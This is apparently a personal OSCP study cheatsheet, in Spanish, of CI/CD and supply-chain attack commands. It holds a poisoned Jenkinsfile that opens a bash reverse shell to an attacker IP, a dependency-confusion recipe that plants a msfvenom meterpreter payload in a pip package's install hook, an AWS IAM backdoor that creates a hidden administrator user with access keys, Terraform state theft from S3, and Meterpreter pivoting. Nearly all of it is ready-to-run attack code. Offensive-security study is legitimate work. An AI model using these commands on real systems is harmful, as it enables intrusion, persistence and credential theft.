---
tipo: cheatsheet
tags: [oscp, cheatsheet, cloud, cicd]
---

# Cheatsheet: CI/CD y Supply Chain

> [!info] Comandos añadidos a medida que avanzo en los módulos.

## Enumeración de Jenkins
```bash
sudo msfdb init
msfconsole --quiet
use auxiliary/scanner/http/jenkins_enum
set RHOSTS <host>
set TARGETURI /
run
```

## Secretos en el historial de Git
```bash
sudo apt install -y gitleaks
gitleaks detect
git log
git show <hash_commit>
echo "<base64>" | base64 --decode
```

## Poisoned Pipeline Execution (Jenkinsfile)
```groovy
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                withAWS(region: 'us-east-1', credentials: 'aws_key') {
                    script {
                        if (isUnix()) {
                            sh 'bash -c "bash -i >& /dev/tcp/<IP>/<puerto> 0>&1" & '
                        }
                    }
                }
            }
        }
    }
}
```
```bash
nc -nvlp <puerto>
```

## Dependency Confusion (pip)
```bash
pip download <paquete>
python3 ./setup.py sdist
pip install ./dist/<paquete>-<version>.tar.gz
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto>
python3 setup.py sdist upload -r <repo>
```
Payload en `setup.py` (`cmdclass={'install': Installer}`, override de `install.run`) + payload en `__getattr__` del módulo importado para ejecución en runtime.

## Enumeración de credenciales AWS comprometidas
```bash
aws configure --profile <nombre>
aws --profile <nombre> sts get-caller-identity
aws --profile <nombre> iam list-user-policies --user-name <user>
aws --profile <nombre> iam list-attached-user-policies --user-name <user>
aws --profile <nombre> iam list-groups-for-user --user-name <user>
aws --profile <nombre> iam get-user-policy --user-name <user> --policy-name <policy>
```

## Backdoor IAM
```bash
aws --profile <nombre> iam create-user --user-name <nombre_discreto>
aws --profile <nombre> iam attach-user-policy --user-name <nombre_discreto> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile <nombre> iam create-access-key --user-name <nombre_discreto>
```

## Pivoting con proxy SOCKS de Meterpreter
```
use auxiliary/server/socks_proxy
run -j
sessions
route add <red> <mascara> <id_sesion>
```
```bash
ssh -fN -L localhost:1080:localhost:1080 <usuario>@<IP_kali>
```

## Terraform state file
```bash
aws --profile <nombre> s3api list-buckets
aws --profile <nombre> s3 cp s3://tf-state-<sufijo>/terraform.tfstate ./
```

## Escaneo de puertos propio (sin herramientas instaladas en el objetivo)
```python
import socket, ipaddress, sys

def port_scan(ip_range, ports):
    for ip in ip_range:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                print(f"Port {port} is open on {ip}")
            sock.close()

ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
ports = [80, 443, 8080]
port_scan(ip_range, ports)
```
